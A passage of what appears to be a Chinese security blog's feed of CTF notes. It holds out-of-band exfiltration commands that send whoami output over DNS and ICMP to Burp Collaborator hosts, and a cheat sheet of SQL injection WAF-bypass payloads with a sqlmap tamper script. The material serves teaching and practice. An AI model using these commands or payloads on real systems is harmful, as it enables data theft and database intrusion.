id="十六进制传输：（hex）–缺点：必须调用powershell"><a href="#十六进制传输：（hex）–缺点：必须调用powershell" class="headerlink" title="十六进制传输：（hex）–缺点：必须调用powershell"></a>十六进制传输：（hex）–缺点：必须调用powershell</h4><pre><code class="php">whoami &gt; test &amp;&amp; certutil -encodehex -f test test.hex 4 &amp;&amp; powershell $text=Get-Content test.hex;$sub=$text -replace(&#39; &#39;,&#39;&#39;);$j=11111;foreach($i in $sub)&#123; $fin=$j.tostring()+&#39;.&#39;+$i+&#39;.xfgmzbb5b6e0m208jake3khksby2mr.burpcollaborator.net&#39;;$j += 1; nslookup $fin &#125;</code></pre><p><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665927157061-f835d131-24fd-45d4-8177-77ba8e15fe08.png" alt="image.png"><br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665927167931-6bc8191b-53ad-4bdb-a9c7-2f9a98f99590.png" alt="image.png"><br>直接16进制转字符串即可<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665927189900-4adb399f-06ed-4a01-98d0-7499428f8ee3.png" alt="image.png"></p><h4 id="通过win-r，直接输入-USERNAME-调用Burp地址来调用DNS解析记录"><a href="#通过win-r，直接输入-USERNAME-调用Burp地址来调用DNS解析记录" class="headerlink" title="通过win+r，直接输入%USERNAME%调用Burp地址来调用DNS解析记录"></a>通过win+r，直接输入%USERNAME%调用Burp地址来调用DNS解析记录</h4><p><strong>使用windows的win+r调出运行，再执行第二行代码，会调用DNS解析</strong></p><pre><code class="php">win+r\\%USERNAME%.0ijp2ee8e9h3p53bmdnh6nknve16pv.burpcollaborator.net</code></pre><p><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665927381636-f775b7db-a2f2-4451-be17-c2a84d198b0b.png" alt="image.png"></p><h4 id="ICMP传输（不能传太大的包，回显信息太长会失败，但依旧隐蔽）"><a href="#ICMP传输（不能传太大的包，回显信息太长会失败，但依旧隐蔽）" class="headerlink" title="ICMP传输（不能传太大的包，回显信息太长会失败，但依旧隐蔽）"></a>ICMP传输（不能传太大的包，回显信息太长会失败，但依旧隐蔽）</h4><pre><code class="php">whoami &gt; output.txt &amp;&amp; powershell $text=Get-Content output.txt;$ICMPClient = New-Object System.Net.NetworkInformation.Ping;$PingOptions = New-Object System.Net.NetworkInformation.PingOptions;$PingOptions.DontFragment = $True;$sendbytes = ([text.encoding]::ASCII).GetBytes($text);$ICMPClient.Send(&#39;rpkg95lzl0ouwwa2t4u8dere258ywn.burpcollaborator.net&#39;,60 * 1000, $sendbytes, $PingOptions);</code></pre><p><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665927749557-8adf803b-be2d-467f-994a-13d976c90613.png" alt="image.png"><br>回显信息失败，但是有dns解析记录<br><img src="/2022/11/22/OOB%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BB/1665927773487-b5c7fa08-f92a-4fa1-94fa-e53050992206.png" alt="image.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;基本概念&quot;&gt;&lt;a href=&quot;#基本概念&quot; class=&quot;headerlink&quot; title=&quot;基本概念&quot;&gt;&lt;/a&gt;基本概念&lt;/h1&gt;&lt;h2 id=&quot;对内攻击&quot;&gt;&lt;a href=&quot;#对内攻击&quot; class=&quot;headerlink&quot; tit</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="常见漏洞和手法" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/"/>
    
    
    <category term="外带攻击" scheme="https://sakurahack-y.github.io/tags/%E5%A4%96%E5%B8%A6%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>sql注入绕过方法总结</title>
    <link href="https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/"/>
    <id>https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</id>
    <published>2022-11-22T13:28:05.000Z</published>
    <updated>2022-11-22T13:36:10.572Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="注释符号绕过"><a href="#注释符号绕过" class="headerlink" title="注释符号绕过"></a>注释符号绕过</h1><p> 常用的注释符有:</p><pre><code class="python">-- 注释内容# 注释内容/*注释内容*/;</code></pre><p> 实例:<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666767888898-cc7bea95-1b04-4fea-b995-9ff16bb9d38d.png" alt="image.png"><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666767908067-787addd2-d49e-41a1-a0d0-266c19aab48c-166912403146839.png" alt="image.png"><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666767983683-86522a64-ad50-4d4e-83b7-6f9d346c6d49-166912403146841.png" alt="image.png"></p><h1 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h1><p> 常用于 waf的正则对大小写不敏感的情况，一般都是题目自己故意这样设计。<br>例如：waf过滤了关键字select，可以尝试使用Select等绕过。<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666768100924-7947e747-35b5-4167-8f97-fb5a22db45d4.png" alt="image.png"></p><h1 id="注释绕过"><a href="#注释绕过" class="headerlink" title="注释绕过"></a>注释绕过</h1><p>在mysql中/<em>admin</em>/是注释符，就像C和js中//代表注释的意思，也可以充当空白符。因为 /<strong>/在sql语句中可以解析成功。事实上许多WAF都考虑到/</strong>/可以作为空白分，但是waf检测 “/<em>.</em>/”很消耗性能，工程师会折中，可能在检测中间引入一些特殊字符，例如：/\w+<em>/。或者，WAF可能只中间检查n个字符“/</em>.{,n}*/”,直至达到检测的最大值，因此payload：</p><pre><code class="python">index.php?id=-1 union/**/select 1,2,3index.php?id=-1 union/*aaaaaaaaaaaaaaa(1万个a)aaaaaaaaaaaaaaaaa*/select 1,2,3</code></pre><h1 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h1><p> 内联注释就是把一些特有的仅在MYSQL上的语句放在 /<em>!…</em>/ 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666768162774-ce9f4f40-99e4-4bc9-acbd-4b3c5b2f23a5.png" alt="image.png"></p><h2 id="双写关键字绕过"><a href="#双写关键字绕过" class="headerlink" title="双写关键字绕过"></a>双写关键字绕过</h2><p> 在某一些简单的waf中，将关键字select等只使用replace()函数置换为空，这时候可以使用双写关键字绕过。例如select变成seleselectct，在经过waf的处理之后又变成select，达到绕过的要求。  </p><h1 id="特殊编码绕过"><a href="#特殊编码绕过" class="headerlink" title="特殊编码绕过"></a>特殊编码绕过</h1><h2 id="十六进制绕过"><a href="#十六进制绕过" class="headerlink" title="十六进制绕过"></a>十六进制绕过</h2><pre><code class="python">mysql&gt; select * from users where username=0xE69D8EE799BD;+----+----------+----------+| id | username | password |+----+----------+----------+|  1 | 李白     | 123      |+----+----------+----------+1 row in set (0.00 sec)</code></pre><h2 id="ascii编码绕过"><a href="#ascii编码绕过" class="headerlink" title="ascii编码绕过"></a>ascii编码绕过</h2><pre><code class="python">mysql&gt; select * from users where password =concat(char(49),char(50),char(51));+----+----------+----------+| id | username | password |+----+----------+----------+|  1 | 李白     | 123      |+----+----------+----------+1 row in set (0.00 sec)</code></pre><p> tip:好像新版mysql不能用了  ，反正遇到多试试吧！</p><h2 id="url编码绕过"><a href="#url编码绕过" class="headerlink" title="url编码绕过"></a>url编码绕过</h2><p>这个有条件，前提时后端过滤以后进行url解码，这时候可以对”这些符号或者字符进行两次url编码<br><img src="https://cdn.nlark.com/yuque/0/2022/jpeg/32380857/1666790234001-83e2175a-f41a-4549-a7d6-5fcdfc619bdf.jpeg#clientId=u65160aa9-d068-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=238&id=uc170500e&margin=%5Bobject%20Object%5D&name=078f9b18a9d913c0123dcccf05c137dd.jpg&originHeight=298&originWidth=1096&originalType=binary&ratio=1&rotation=0&showTitle=false&size=61815&status=done&style=none&taskId=u6e69cf22-741d-4abe-a151-10dca260ccd&title=&width=876.8" alt="078f9b18a9d913c0123dcccf05c137dd.jpg"></p><h2 id="unicode编码绕过"><a href="#unicode编码绕过" class="headerlink" title="unicode编码绕过"></a>unicode编码绕过</h2><p>** IIS中间件**可以识别Unicode字符，当URL中存在Unicode字符时，IIS会自动进行转换！</p><pre><code class="python">假如对select关键字进行了过滤，可以对其中几个字母进行unicode编码：se%u006cect</code></pre><h1 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h1><p> 一般绕过空格过滤的方法有以下几种方法来取代空格 </p><pre><code class="python">/**/()回车(url编码中的%0a)`(tap键上面的按钮)tap两个空格</code></pre><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666782853847-a136179a-f8da-406d-8fce-5982a0c26636-166912403146946.png" alt="image.png"><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666782900873-042acb46-07f4-4645-ba99-4db87a159f3e-166912403146948.png" alt="image.png"><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666782960545-2633b2f1-ab42-4d3f-bfc3-0e84d9bd6cc2-166912403146950.png" alt="image.png"><br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666782995285-ead5c057-0a63-4024-933d-c0098a29550b-166912403146952.png" alt="image.png"></p><h1 id="过滤or-and-xor-not-绕过"><a href="#过滤or-and-xor-not-绕过" class="headerlink" title="过滤or and xor not 绕过"></a>过滤or and xor not 绕过</h1><pre><code class="python">and = &amp;&amp;or = ||xor = | # 异或not = !</code></pre><h1 id="过滤等号-绕过"><a href="#过滤等号-绕过" class="headerlink" title="过滤等号=绕过"></a>过滤等号=绕过</h1><h2 id="使用like绕过"><a href="#使用like绕过" class="headerlink" title="使用like绕过"></a>使用like绕过</h2><p> 不加通配符的like执行的效果和=一致，所以可以用来绕过。<br>** 正常加上通配符的like:**<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666783130840-322e337e-c4e9-4eb1-ade9-98797c19624b-166912403146954.png" alt="image.png"><br>** 不加上通配符的like可以用来取代=:**<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666783196934-51d6dabd-9e99-4074-9110-22efe27cadd3-166912403146956.png" alt="image.png"></p><h2 id="rlike绕过"><a href="#rlike绕过" class="headerlink" title="rlike绕过"></a>rlike绕过</h2><p>** rlike:模糊匹配，只要字段的值中存在要查找的 部分 就会被选择出来**<br>用来取代=时，rlike的用法和上面的like一样，没有通配符效果和=一样<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666783287214-2907bb1b-d180-4b9a-bf9d-6d7727cb2919-166912403146958.png" alt="image.png"></p><h2 id="regexp绕过"><a href="#regexp绕过" class="headerlink" title="regexp绕过"></a>regexp绕过</h2><p> regexp:MySQL中使用 REGEXP 操作符来进行正则表达式匹配<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666783387574-65ffe75e-60ef-4569-8209-1f704f75ccf3-166912403146960.png" alt="image.png"></p><h2 id="使用大小于号来绕过"><a href="#使用大小于号来绕过" class="headerlink" title="使用大小于号来绕过"></a>使用大小于号来绕过</h2><p><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666783427074-e021ae59-4b24-42a9-bf2f-ddbc310bf2bc-166912403146962.png" alt="image.png"></p><h2 id="lt-gt-等价于"><a href="#lt-gt-等价于" class="headerlink" title="&lt;&gt; 等价于 !="></a>&lt;&gt; 等价于 !=</h2><p> 所以在前面再加一个!结果就是等号了<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666783488413-ecce5e46-10e2-4873-b0e9-c833976b6440-166912403146964.png" alt="image.png"></p><h1 id="过滤大小于号绕过"><a href="#过滤大小于号绕过" class="headerlink" title="过滤大小于号绕过"></a>过滤大小于号绕过</h1><p>为了方便测试，我把表的内容修改了一下:<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666783825320-7d3035e0-ebae-4ed3-8a89-95c0330ea498-166912403146966.png" alt="image.png"><br> 在sql盲注中，一般使用大小于号来判断ascii码值的大小来达到爆破的效果。但是如果过滤了大小于号的话，  我们 可以使用以下的关键字来绕过 </p><h2 id="greatest绕过"><a href="#greatest绕过" class="headerlink" title="greatest绕过"></a>greatest绕过</h2><pre><code class="python">greatest(n1, n2, n3…):返回n中的最大值</code></pre><p>嗯，我们来用这个函数来测试一下如何盲注:</p><pre><code class="python">mysql&gt; select * from users where id=1 and greatest(ascii(substr(username,1,1)),1)=97;+----+----------+----------+| id | username | password |+----+----------+----------+|  1 | admin    | admin666 |+----+----------+----------+1 row in set (0.00 sec)</code></pre><h2 id="least绕过"><a href="#least绕过" class="headerlink" title="least绕过"></a>least绕过</h2><pre><code class="python">least(n1,n2,n3...)  返回n中的最小值</code></pre><pre><code class="python">mysql&gt; select * from users where id=1 and least(ascii(substr(username,1,1)),9999)=97;+----+----------+----------+| id | username | password |+----+----------+----------+|  1 | admin    | admin666 |+----+----------+----------+1 row in set (0.00 sec)</code></pre><h2 id="strcmp绕过"><a href="#strcmp绕过" class="headerlink" title="strcmp绕过"></a>strcmp绕过</h2><pre><code class="python">strcmp(str1,str2):若所有的字符串均相同，则返回STRCMP()，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1</code></pre><pre><code class="python">mysql&gt; select * from users where id=1 and strcmp(ascii(substr(username,1,1)),97);Empty set (0.00 sec)mysql&gt; select * from users where id=1 and strcmp(ascii(substr(username,1,1)),96);+----+----------+----------+| id | username | password |+----+----------+----------+|  1 | admin    | admin666 |+----+----------+----------+1 row in set (0.00 sec)</code></pre><h2 id="in关键字绕过"><a href="#in关键字绕过" class="headerlink" title="in关键字绕过"></a>in关键字绕过</h2><pre><code class="python">mysql&gt; select * from users where id=1 and substr(username,1,1) in (&#39;a&#39;);+----+----------+----------+| id | username | password |+----+----------+----------+|  1 | admin    | admin666 |+----+----------+----------+1 row in set (0.00 sec)</code></pre><h2 id="between-a-and-b-绕过"><a href="#between-a-and-b-绕过" class="headerlink" title="between a and b  绕过"></a>between a and b  绕过</h2><pre><code class="python">mysql&gt; select * from users where id between 1 and 2;+----+----------+----------+| id | username | password |+----+----------+----------+|  1 | admin    | admin666 ||  2 | guest    | guest123 |+----+----------+----------+2 rows in set (0.00 sec)mysql&gt; select * from users where id=1 and substr(username,1,1) between &#39;a&#39; and &#39;e&#39;;+----+----------+----------+| id | username | password |+----+----------+----------+|  1 | admin    | admin666 |+----+----------+----------+1 row in set (0.00 sec)</code></pre><p> 使用between a and b判等  </p><pre><code class="python">mysql&gt; select * from users where id=1 and substr(username,1,1) between &#39;a&#39; and &#39;a&#39;;+----+----------+----------+| id | username | password |+----+----------+----------+|  1 | admin    | admin666 |+----+----------+----------+1 row in set (0.00 sec)</code></pre><h1 id="过滤引号绕过"><a href="#过滤引号绕过" class="headerlink" title="过滤引号绕过"></a>过滤引号绕过</h1><h2 id="使用十六进制"><a href="#使用十六进制" class="headerlink" title="使用十六进制"></a>使用十六进制</h2><pre><code class="python">mysql&gt; select * from users where username=0xE69D8EE799BD;+----+----------+----------+| id | username | password |+----+----------+----------+|  1 | 李白     | 123      |+----+----------+----------+1 row in set (0.00 sec)</code></pre><h2 id="宽字节"><a href="#宽字节" class="headerlink" title="宽字节"></a>宽字节</h2><p> 常用在web应用使用的字符集为GBK时，并且过滤了引号，就可以试试宽字节  </p><pre><code class="python">%df\&#39; = %df%5c%27=縗’</code></pre><h1 id="过滤逗号绕过"><a href="#过滤逗号绕过" class="headerlink" title="过滤逗号绕过"></a>过滤逗号绕过</h1><p>sql盲注时常用到以下的函数：<br><strong>substr()</strong></p><pre><code class="python">substr(string, pos, len):从pos开始，取长度为len的子串substr(string, pos):从pos开始，取到string的最后</code></pre><p><strong>substring()</strong></p><pre><code class="python">用法和substr()一样</code></pre><p><strong>mid()</strong></p><pre><code class="python">用法和substr()一样，但是mid()是为了向下兼容VB6.0，已经过时，以上的几个函数的pos都是从1开始的</code></pre><p><strong>left()和right()</strong></p><pre><code class="python">left(string, len)和right(string, len):分别是从左或从右取string中长度为len的子串</code></pre><p><strong>limit</strong></p><pre><code class="python">limit pos len:在返回项中从pos开始去len个返回值，pos的从0开始</code></pre><p><strong>ascii()和char()</strong></p><pre><code class="python">ascii(char):把char这个字符转为ascii码char(ascii_int):和ascii()的作用相反，将ascii码转字符</code></pre><p> 如果waf过滤了逗号，并且只能盲注（盲注基本离不开逗号啊喂），在取子串的几个函数中，有一个替代逗号的方法就是使用from pos for len，其中pos代表从pos个开始读取len长度的子串  </p><h2 id="from-pos-for-len绕过"><a href="#from-pos-for-len绕过" class="headerlink" title="from pos for len绕过"></a>from pos for len绕过</h2><p> 例如在substr()等函数中，常规的写法是:</p><pre><code class="python">mysql&gt; select substr(&quot;admin&quot;,1,2);+---------------------+| substr(&quot;admin&quot;,1,2) |+---------------------+| ad                  |+---------------------+1 row in set (0.00 sec)</code></pre><p> 如果过滤了逗号，可以这样使用from pos for len来取代:</p><pre><code class="python">mysql&gt; select substr(&quot;admin&quot; from 1 for 3);+------------------------------+| substr(&quot;admin&quot; from 1 for 3) |+------------------------------+| adm                          |+------------------------------+1 row in set (0.00 sec)</code></pre><p>所以遇到盲注时，我们可构造payload:</p><pre><code class="python">mysql&gt; select * from users where id =-1 union select ascii(substr(database() from 1 for 1)) &gt;120,2,3;+------+----------+----------+| id   | username | password |+------+----------+----------+|    0 | 2        | 3        |+------+----------+----------+1 row in set (0.00 sec)mysql&gt; select * from users where id =-1 union select ascii(substr(database() from 1 for 1)) &gt;10,2,3;+------+----------+----------+| id   | username | password |+------+----------+----------+|    1 | 2        | 3        |+------+----------+----------+1 row in set (0.00 sec)</code></pre><h2 id="join关键字绕过"><a href="#join关键字绕过" class="headerlink" title="join关键字绕过"></a>join关键字绕过</h2><pre><code class="python">mysql&gt; select * from users where id =-1 union select * from (select 1)a join (select database())b join(select 3)c;+----+----------+----------+| id | username | password |+----+----------+----------+|  1 | test     | 3        |+----+----------+----------+1 row in set (0.00 sec)</code></pre><h2 id="like关键字绕过"><a href="#like关键字绕过" class="headerlink" title="like关键字绕过"></a>like关键字绕过</h2><p> 适用于substr()等提取子串的函数中的逗号  </p><h2 id="使用offset关键字"><a href="#使用offset关键字" class="headerlink" title="使用offset关键字"></a>使用offset关键字</h2><p>适用于limit中的逗号被过滤的情况<br>limit 2,1等价于limit 1 offset 2</p><pre><code class="python">mysql&gt; select * from users limit 1,1;+----+----------+----------+| id | username | password |+----+----------+----------+|  2 | guest    | guest123 |+----+----------+----------+1 row in set (0.00 sec)mysql&gt; select * from users limit 1 offset 1;+----+----------+----------+| id | username | password |+----+----------+----------+|  2 | guest    | guest123 |+----+----------+----------+1 row in set (0.00 sec)</code></pre><h1 id="过滤函数绕过"><a href="#过滤函数绕过" class="headerlink" title="过滤函数绕过"></a>过滤函数绕过</h1><h2 id="sleep被过滤绕过"><a href="#sleep被过滤绕过" class="headerlink" title="sleep被过滤绕过"></a>sleep被过滤绕过</h2><p>我们使用 benchmark()  函数来代替:<br>MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度。  参数可以是需要执行的次数和表达式。第一个参数是执行次数，第二个执行的表达式</p><pre><code class="python">mysql&gt; select 1,2,3 and benchmark(1000000000,1);+---+---+-------------------------------+| 1 | 2 | 3 and benchmark(1000000000,1) |+---+---+-------------------------------+| 1 | 2 |                             0 |+---+---+-------------------------------+1 row in set (3.08 sec)</code></pre><h2 id="ascii-被过滤"><a href="#ascii-被过滤" class="headerlink" title="ascii()被过滤"></a>ascii()被过滤</h2><p> hex()、bin()<br>替代之后再使用对应的进制转string即可  </p><h2 id="group-concat-被过滤"><a href="#group-concat-被过滤" class="headerlink" title="group_concat()被过滤"></a>group_concat()被过滤</h2><p><strong>concat_ws()   第一个参数为分隔符</strong></p><pre><code class="python">mysql&gt; select concat_ws(&quot;,&quot;,database(),user());+----------------------------------+| concat_ws(&quot;,&quot;,database(),user()) |+----------------------------------+| test,root@localhost              |+----------------------------------+1 row in set (0.00 sec)</code></pre><h2 id="substr-substring-mid-可以相互取代-取子串的函数还有left-right-和locate等"><a href="#substr-substring-mid-可以相互取代-取子串的函数还有left-right-和locate等" class="headerlink" title="substr(),substring(),mid()可以相互取代, 取子串的函数还有left(),right()和locate等"></a>substr(),substring(),mid()可以相互取代, 取子串的函数还有left(),right()和locate等</h2><h2 id="user-和datadir被过滤"><a href="#user-和datadir被过滤" class="headerlink" title="user()和datadir被过滤"></a>user()和datadir被过滤</h2><pre><code class="python">user() --&gt; @@userdatadir–&gt;@@datadir</code></pre><h2 id="ord-–-gt-ascii-这两个函数在处理英文时效果一样，但是处理中文等时不一致。"><a href="#ord-–-gt-ascii-这两个函数在处理英文时效果一样，但是处理中文等时不一致。" class="headerlink" title="ord()–&gt;ascii():这两个函数在处理英文时效果一样，但是处理中文等时不一致。"></a>ord()–&gt;ascii():这两个函数在处理英文时效果一样，但是处理中文等时不一致。</h2><h1 id="垃圾字符填充绕过"><a href="#垃圾字符填充绕过" class="headerlink" title="垃圾字符填充绕过"></a>垃圾字符填充绕过</h1><p> 一般为了考虑性能等原因，程序员在设置WAF绕过规则时设置了过滤的数据包长度，如果数据包太大或太长，就会直接放弃匹配过滤后面的数据，从而略过这个数据包。因此我们可以通过传入大量的参数值，超到WAF绕过的临界值，从而绕过  </p><pre><code class="python">index.php?id=-1aaaaaa(10万个a)aaaa union select 1,2,3</code></pre><h1 id="参数污染"><a href="#参数污染" class="headerlink" title="参数污染"></a>参数污染</h1><p> 简单来说，存在多个同名参数的情况下，可能存在逻辑层和 WAF 层对参数的取值不同，即可能逻辑层使用的第一个参数，而 WAF 层使用的第二个参数，而这时我们只需要第二个参数正常，通过WAF层，然后在第一个参数中插入注入语句，这样组合起来就可以绕过 WAF，payload：  </p><pre><code class="python">index.php?name=first&amp;name=last</code></pre><p> 而由于部分中间件的不同，部分检测规则存在差异，下面是一些服务器检测规则：<br> <img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666791032465-94ed2b6c-3422-4ca0-ae48-3eec1145a569.png" alt="8b2d8e44a6d34ea9b7b6e19a1fc6ccb9.png"></p><h1 id="keep-alive-持久连接"><a href="#keep-alive-持久连接" class="headerlink" title="keep-alive(持久连接)"></a><strong>keep-alive(持久连接)</strong></h1><p>在HTTP请求头部中有Connection这个字段，用来判断建立的 TCP连接会根据此字段的值来判断是否断开，当发送的内容太大，超过一个 http 包容量，需要分多次发送时，值会变成keep-alive，Keep-Alive功能使客户端到服务器端的连接持续有效，当出现对服务器的后继请求时，Keep-Alive功能避免了建立或者重新建立连接。即本次发起的 http 请求所建立的 tcp 连接不断开，直到所发送内容结束Connection为close为止。<br>因此我们可以使用burpsuite抓包，手动将connection值设置为 keep-alive，然后在 http 请求报文中构造多个请求，将我们的注入代码隐藏在第 n 个请求中，从而绕过 waf。</p><h1 id="请求方式绕过："><a href="#请求方式绕过：" class="headerlink" title="请求方式绕过："></a><strong>请求方式绕过：</strong></h1><p>一些 WAF 对于get请求和post请求的处理机制不一样，可能对 POST 请求稍加松懈，因此给GET请求变成POST请求有可能绕过拦截。<br>一些 WAF 检测到POST请求后，就不会对GET携带的参数进行过滤检测，因此导致被绕过。<br>一般方法便是采用burpsuite抓包，更改提交方式，如下<br><img src="/2022/11/22/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/1666791171451-68652e53-879a-46d9-ab0e-b574caa44cee.png" alt="6bcc270dcc934c7984213eb916a17f18.png"></p><h1 id="静态资源"><a href="#静态资源" class="headerlink" title="静态资源"></a>静态资源</h1><p>特定的静态资源后缀请求，常见的静态文件(.js .jpg .swf .css等等)，类似白名单机制,waf为了提高检测效率，会直接放弃检测这样一些静态文件名后缀的请求。payload:</p><pre><code class="python">index.php/1.js?id=1</code></pre><p>备注: Aspx/php只识别到前面的.aspx/.php后面基本不识别</p><h1 id="url白名单"><a href="#url白名单" class="headerlink" title="url白名单"></a>url白名单</h1><p>为了防止误拦，部分WAF内置默认的白名单列表，如admin/manager/system等管理后台。只要url中存在白名单的字符串，就作为白名单不进行检测。常见的url构造姿势:<br>index.php/admin.php?id=1<br>index.php?a=/manage/&amp;b=…/etc/passwd<br>index.php/…/…/…/ manage/…/sql.asp?id=2<br>WAF对传入的参数进行比较，只要uri中存在/manage/，/admin/ 就作为白名单直接放行，payload:</p><pre><code class="python">index.php?a=/manage/&amp;id=1 union select 1,2,3</code></pre><h1 id="缓冲区溢出绕过"><a href="#缓冲区溢出绕过" class="headerlink" title="缓冲区溢出绕过"></a><strong>缓冲区溢出绕过</strong></h1><pre><code class="python">(id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAA)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 ,27,28,29,30,31,32,33,34,35,36–+</code></pre><p> 其中0xAAAAAAAAAAAAAAAAAAAAA这里A越多越好。。一般会存在临界值，其实这种方法还对后缀名的绕过也有用)  </p><h1 id="使用sqlmap进行bypass"><a href="#使用sqlmap进行bypass" class="headerlink" title="使用sqlmap进行bypass"></a>使用sqlmap进行bypass</h1><p>我们在知道替换规则的情况下可以自己写sqlmap的bypass脚本<br>在sqlmap文件夹下的/tamper/下，自己创建个py文件</p><pre><code class="python">#!/usr/bin/env pythonfrom lib.core.enums import PRIORITY__priority__ = PRIORITY.HIGHESTdef dependencies():    passdef tamper(payload, **kwargs):    payload = payload.replace(&quot;&#39;&quot;,&quot;%1$&#39;&quot;)　　　　　　#将什么替换成什么    payload = payload.replace(&quot;u&quot;,&quot;\u0075&quot;)　　　　  #将什么替换成什么，可以写很多个    return payload</code></pre><p> 在sqlmap使用的时候调用这个模块，即可使用自定义过程  </p><pre><code class="python">sqlmap --tamper=模块名.py -u &#39;http://xxx.xx.xx.xx/ddd.php?id=1&#39;</code></pre><h1 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h1><p><a href="https://blog.csdn.net/huanghelouzi/article/details/82995313">https://blog.csdn.net/huanghelouzi/article/details/82995313</a><br><a href="https://blog.csdn.net/weixin_52118430/article/details/123607959">https://blog.csdn.net/weixin_52118430/article/details/123607959</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;注释符号绕过&quot;&gt;&lt;a href=&quot;#注释符号绕过&quot; class=&quot;headerlink&quot; title=&quot;注释符号绕过&quot;&gt;&lt;/a&gt;注释符号绕过&lt;/h1&gt;&lt;p&gt; 常用的注释符有:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;-</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="常见漏洞和手法" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%89%8B%E6%B3%95/"/>
    
    
    <category term="sql" scheme="https://sakurahack-y.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>sql注入总结</title>
    <link href="https://sakurahack-y.github.io/2022/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
